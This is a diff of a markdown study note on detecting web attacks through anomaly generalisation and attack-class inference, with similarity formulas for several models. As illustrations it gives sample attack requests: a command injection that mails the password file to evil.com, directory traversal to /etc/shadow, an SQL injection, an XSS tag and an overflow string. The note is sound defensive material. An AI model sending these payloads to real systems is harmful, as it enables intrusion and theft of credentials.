@@ -3,63 +3,93 @@
 <!-- TOC -->
 
 - [Background Knowledge and Insight](#background-knowledge-and-insight)
+    - [Web application](#web-application)
+    - [Anomaly detection for web security](#anomaly-detection-for-web-security)
+    - [Generalization and Characterization](#generalization-and-characterization)
 - [Goal](#goal)
-- [Architecture](#architecture)
-    - [Event Collection](#event-collection)
-    - [Anomaly detection](#anomaly-detection)
-    - [Anomaly signature generation](#anomaly-signature-generation)
-    - [Anomaly aggregation](#anomaly-aggregation)
-    - [Attack class Inference](#attack-class-inference)
-- [Feature](#feature)
-    - [Attribute length](#attribute-length)
-    - [Character distribution](#character-distribution)
-    - [Structural inference](#structural-inference)
+- [Architecture Overview](#architecture-overview)
+- [Event Collection](#event-collection)
+- [Anomaly Detection](#anomaly-detection)
+    - [Attribute Length](#attribute-length)
+    - [Character Distribution](#character-distribution)
+    - [Structural Inference](#structural-inference)
     - [Token finder](#token-finder)
+- [Anomaly Aggregation](#anomaly-aggregation)
+- [Anomaly Signature Generation](#anomaly-signature-generation)
+    - [Attribute Length](#attribute-length-1)
+    - [Character Distribution](#character-distribution-1)
+    - [Structural Inference](#structural-inference-1)
+    - [Token finder](#token-finder-1)
+- [Attack Class Inference](#attack-class-inference)
+    - [Families of Attacks](#families-of-attacks)
+        - [Directory Traversal](#directory-traversal)
+        - [Cross-Site Scripting](#cross-site-scripting)
+        - [SQL Injection](#sql-injection)
+        - [Buffer Overflow](#buffer-overflow)
 - [Reference](#reference)
 
 <!-- /TOC -->
 
 ## Background Knowledge and Insight
 
-* Web application
-    * Easy to develop, deploy, and access
-    * Critical security vulnerabilities
-        * Lack of awareness of security issues
-        * Feature-driven development
-        * Time-to-market constraints
-* Anomaly detection for web security
-    * Pro
-        * Adapt to ad-hoc nature of web apps
-            * Custom-developed
-        *  Identify previously unknown attacks
-    * Con
-        * Prone to producing false positives
-        * Not characterization of attack causing anomaly(the nature of a detected attack) 
-* Anomaly generalization
+### Web application
+
+* Easy to develop, deploy, and access
+* Critical security vulnerabilities
+    * Lack of awareness of security issues
+    * Feature-driven development
+    * Time-to-market constraints
+
+### Anomaly detection for web security
+
+```
+128.111.41.15 "GET /cgi-bin/purchase?itemid=1a6f62e612&cc=mastercard" 200
+128.111.43.24 "GET /cgi-bin/purchase?itemid=61d2b836c0&cc=visa" 200
+128.111.48.69 "GET /cgi-bin/purchase?itemid=a625f27110&cc=mastercard" 200
+131.175.5.35 "GET /cgi-bin/purchase?itemid=7e2877b177&cc=amex" 200
+161.10.27.112 "GET /cgi-bin/purchase?itemid=80d2988812&cc=visa" 200
+...
+128.111.11.45 "GET /cgi-bin/purchase?itemid=109agfe111;ypcat%20passwd|mail%20wily@evil.com" 200
+```
+
+Sample log entries associated with invocations of the `purchase` application. The last entry represents an attack against the application.
+
+* Pro
+    * Adapt to ad-hoc nature of web apps
+        * Custom-developed
+    * Identify previously unknown attacks
+* Con
+    * Prone to producing false positives
+    * Not characterization of attack causing anomaly(the nature of a detected attack)
+
+### Generalization and Characterization
+
+* Generalization
     * Group similar anomalies together
     * Administrator analyzes each group
-        * If false positives: Filter
-        * If instances of attack: Generate anomaly signature
-* Attack characterization
+        * If false positives: filter
+        * If instances of attack: generate anomaly signature
+* Characterization
     * Types of exploitations follow specific rules
+    * Not misuse detection signature
+        * Only apply to the anomaly portion of the event
+    * Help for analyzing and patching novel vulnerabilities
 
 ## Goal
 
 * Detection system can be deployed on an existing web-based system
 * Detecting unknown attacks, in the unsupervised fashion
-    * **Generalize** similar anomalies
-    * **Characterize** the normal behavior
 
-## Architecture
+## Architecture Overview
 
 ![Architecture of web intrusion detection system](images/G&C.png)
 
-### Event Collection
+## Event Collection
 
 * Web server access logs
 * Source of the events is unknown
 
-### Anomaly detection
+## Anomaly Detection
 
 * Learns profiles of normal application behavior and detect deviations
 * Input: URLs of successful GET requests
@@ -73,130 +103,162 @@
         * Weighted sum of the individual model scores
     * Alert
 
-### Anomaly signature generation
+### Attribute Length
+
+* **Many attribute values are either fixed in size or vary over a small range**
+* Approximate actual(unknown) distribution of attribute lengths
+* Chebyshev inequality
+
+### Character Distribution
+
+* **Many attribute take values that have similar character distribution**
+* Typical queries: human readable; Slow drop off
+* ICD(idealized character distribution): Sorted frequencies of 256 chars; Pearson test
+* Relative character frequencies
+    * Malicious queries
+        * Sharp drop-off, large occurrences of a single character
+        * Little drop-off, random character values
+
+### Structural Inference
+
+* **Many attribute values can be modeled as strings generated by a regular grammar**
+* Construct probabilistic grammar
+* Anomaly score calculated as product of transition probabilities along path through NFA for a given value
+
+### Token finder
+
+* **Many attribute takes values that are drawn from a small set of constants**
+* Flags/indices
+* Random/enumeration
+
+## Anomaly Aggregation
+
+* Groups anomalies according to model-specific similarity operations
+
+## Anomaly Signature Generation
 
 * Generates anomaly signatures to group "similar" alerts
 * Signature set can be modified at run-time
 * Similarity metric: model-dependent
 * Anomaly signature is generated by the relaxation of the parameters used by the anomaly models
 
-### Anomaly aggregation
+### Attribute Length
 
-* Groups anomalies according to model-specific similarity operations
+* $$\mu$$, sample mean
+* $$\sigma^2$$, variance
+* $$l_{\text{obsv}}$$, observed attribute length
+* $$l_{\text{orig}}$$, anomalous attribute length
+* $$d_{\text{attr}}$$, configurable distance
+* $$\psi_{\text{attrlen}}(l_{\text{obsv}}, l_{\text{orig}})$$, similarity operator
+* $$\psi_{\text{attrlen}} \equiv \lvert \frac{\sigma^2}{(l_{\text{obsv}} - \mu)^2} - \frac{\sigma^2}{(l_{\text{orig}} - \mu)^2} \rvert < d_{\text{attr}}$$
 
-### Attack class Inference
+### Character Distribution
+
+* $$m$$, $$\#$$ dominating character value
+* $$c_i$$, the $$i^{th}$$ domination character value
+* $$f_i$$, corresponding relative frequency
+* $$C$$, set of $$m$$ dominating character values and frequency pairs extracted from the model
+    * $$C = \{ (c_1, f_1), (c_2, f_2), (c_m, f_m) \}$$
+* $$C_{\text{obsv}}$$, set of dominating characters from the observed attribute value
+* $$C_{\text{orig}}$$, corresponding set from he original anomalous value
+* Sharp drop-off
+    * $$\psi_{\text{cdist}} \equiv min \{ \lvert f_{\text{obsv}, i} - f_{\text{orig}, j} \rvert \} < d_{\text{cdist}}$$
+* Little drop-off
+    * $$\psi_{\text{cdist}} \equiv max \{ \lvert f_{\text{obsv}, i} - f_{\text{orig}, j} \rvert \} < d_{\text{cdist}}$$
+
+### Structural Inference
+
+* Extract prefix up to and including first grammar-violating character
+    * Intuition: **Prefix shared by attacks against same app**
+* Mapping
+    * "a" for all lower-case alphabetic chars
+    * "A" for all upper-case alphabetic chars
+    * "0" for all numeric chars
+    * All other chars unchanged
+* $$\psi_{\text{structure}} ( s_{\text{obsv}}, s_{\text{orig}} ) \equiv s_{\text{obsv}, i} - s_{\text{orig}, i}$$
+
+### Token finder
+
+* $$lex$$, lexicographical similarity function
+    * Hamming distance
+    * Levenshtein distance
+* $$\psi_{\text{token}} \equiv lex(l_{\text{obsv}}, l_{\text{orig}})$$
+
+## Attack Class Inference
 
 * Characterizes types of attacks anomalies may represent
-* Challenge: Anomalies hard for human analysts to interpret
+* Anomalies hard for human analysts to interpret
 * Observation: Attack classes violate anomaly models in consistent ways
     * Use consistencies to provide hints to analyst
 * Compared with misuse detection
     * Difference: Class inference only applied to anomalous events
-    * Advantage: Class inference can be less precise
-* Families of attacks
-    * Directory traversal
-        * Unauthorized access to files on web server
-            * Use "." and "/"
-        * **Heuristic activated**
-            * **Character distribution: dominating char set C intersecting {".", "/"}**
-            * **Structural inference: prefix ending in "." or "/"**
-        * Attack inference
-            * Scan anomalous attribute value for regex (/|\\.\\.)+
-        * Example
-            * Itemid = "cat ../../../../../etc/shadow"
-            * Char distribution model detects high count of . and /
-            * Structural inference model detects anomalous structure
-            * Attack inference matches (/|\\.\\.)+ & detects directory traversal
-    * Cross-site scripting
-        * Execute malicious code on client-side machine
-        * **Heuristic activated: structural inference, character distribution, token finder**
-            * Insertion of HTML tags
-            * Use of client-side scripting code as content
-        * Attack inference: scan for JavaScript or HTML fragments
-            * "script", "<" , ">"
-    * SQL injection
-        * Unauthorized modifications to SQL queries
-            * Escape an input to a query parameter
-        * **Heuristic activated: attribute structure**
-        * Attack inference
-            * Scan attribute value for SQL keywords (e.g., SELECT, INSERT, UPDATE, DELETE, ', --)
-    * Buffer overflow
-        * Send a large amount of data
-            * overflow a buffer
-            * overwrite return address, data, function pointers, sensitive variables
-        * Significant deviation from normal profiles
-        * **Heuristic activated: character distribution, structural inference, attribute length**
-        * Attack inference
-            * Scan attribute string for binary values (ASCII chars > 0x80)
+    * Advantage: Class inference can be more abstract (andless precise)
 
-## Feature
+### Families of Attacks
 
-### Attribute length
+#### Directory Traversal
 
-* Characterization
-    * **Many attribute values are either fixed in size or vary over a small range**
-    * Approximate actual(unknown) distribution of attribute lengths
-    * Chebyshev inequality
-        * Weak bound
-* Generalization
-    * $$\mu$$, sample mean
-    * $$\sigma^2$$, variance
-    * $$l_{\text{obsv}}$$, observed attribute length
-    * $$l_{\text{orig}}$$, anomalous attribute length
-    * $$d_{\text{attr}}$$, configurable distance
-    * $$\psi_{\text{attrlen}}(l_{\text{obsv}}, l_{\text{orig}})$$, similarity operator
-    * $$\psi_{\text{attrlen}} \equiv \lvert \frac{\sigma^2}{(l_{\text{obsv}} - \mu)^2} - \frac{\sigma^2}{(l_{\text{orig}} - \mu)^2} \rvert < d_{\text{attr}}$$
+```
+GET /cgi-bin/show.cgi?sID=12345&file=../../../../maillog
+```
 
-### Character distribution
+* Unauthorized access to files on web server
+    * Use `.` and `/`
+* Heuristic activated
+    * Character distribution: dominating char set $$C$$ intersecting {`.`, `/`}
+    * Structural inference: prefix ending in `.` or `/`
+* Attack inference
+    * Scan anomalous attribute value for regex `(/|\\.\\.)+`
+* Example
+    * Itemid = `cat ../../../../../etc/shadow`
+    * Char distribution model detects high count of `.` and `/`
+    * Structural inference model detects anomalous structure
+    * Attack inference matches `(/|\\.\\.)+` and detects directory traversal
 
-* Characterization
-    * **Many attribute take values that have similar character distribution**
-    * Typical queries: human readable; Slow drop off
-    * ICD(idealized character distribution): Sorted frequencies of 256 chars; Pearson test
-    * Relative character frequencies
-        * Malicious queries
-            * Sharp drop-off, large occurrences of a single character
-            * Little drop-off, random character values
-* Generalization
-    * $$m$$, $$\#$$ dominating character value
-    * $$c_i$$, the $$i^{th}$$ domination character value
-    * $$f_i$$, corresponding relative frequency
-    * $$C$$, set of $$m$$ dominating character values and frequency pairs extracted from the model
-    * $$C = \{ (c_1, f_1), (c_2, f_2), (c_m, f_m) \}$$
-    * $$C_{\text{obsv}}$$, set of dominating characters from the observed attribute value
-    * $$C_{\text{orig}}$$, corresponding set from he original anomalous value
-    * Sharp drop-off
-        * $$\psi_{\text{cdist}} \equiv min \{ \lvert f_{\text{obsv}, i} - f_{\text{orig}, j} \rvert \} < d_{\text{cdist}}$$
-    * Little drop-off
-        * $$\psi_{\text{cdist}} \equiv max \{ \lvert f_{\text{obsv}, i} - f_{\text{orig}, j} \rvert \} < d_{\text{cdist}}$$
+#### Cross-Site Scripting
 
-### Structural inference
+```
+GET /cgi-bin/show.cgi?sID=12345&file=<script>...</script>
+```
 
-* Characterization
-    * **Many attribute values can be modeled as strings generated by a regular grammar**
-    * Construct probabilistic grammar
-    * Anomaly score calculated as product of transition probabilities along path through NFA for a given value
-* Generalization
-    * Extract prefix up to and including first grammar-violating character
-        * Intuition: **Prefix shared by attacks against same app**
-    * Mapping
-        * "a" for all lower-case alphabetic chars
-        * "A" for all upper-case alphabetic chars
-        * "0" for all numeric chars
-        * All other chars unchanged
-    * $$\psi_{\text{structure}} ( s_{\text{obsv}}, s_{\text{orig}} ) \equiv s_{\text{obsv}, i} - s_{\text{orig}, i}$$
+* Execute malicious code on client-side machine
+* Heuristic activated
+    * Structural inference, character distribution, token finder
+        * Insertion of HTML tags
+        * Use of client-side scripting code as content
+* Attack inference
+    * Scan for JavaScript or HTML fragments
+        * `script`, `<` ,`>`
 
-### Token finder
+#### SQL Injection
 
-* Characterization
-    * **Many attribute takes values that are drawn from a small set of constants**
-    * Flags/indices
-    * Random/enumeration
-* Generalization
-    * $$lex$$, lexicographical similarity function
-        * Hamming distance
-        * Levenshtein distance
-    * $$\psi_{\text{token}} \equiv lex(l_{\text{obsv}}, l_{\text{orig}})$$
+```
+GET /cgi-bin/show.cgi?sID=' or 1=1;--&file=access.log
+```
+
+* Unauthorized modifications to SQL queries
+    * Escape an input to a query parameter
+* Heuristic activated
+    * Attribute structure
+* Attack inference
+    * Scan attribute value for SQL keywords (e.g., `SELECT`, `INSERT`, `UPDATE`, `DELETE`, `'`, `--`)
+
+#### Buffer Overflow
+
+```
+GET /cgi-bin/show.cgi?sID=12345&file=%90%90%90%90%90...
+```
+
+* Send a large amount of data
+    * Overflow a buffer
+    * Overwrite return address, data, function pointers, sensitive variables
+* Significant deviation from normal profiles
+* Heuristic activated
+    * Character distribution
+    * Structural inference
+    * Attribute length
+* Attack inference
+    * Scan attribute string for binary values (ASCII char values > `0x80`)
 
 ## Reference
 
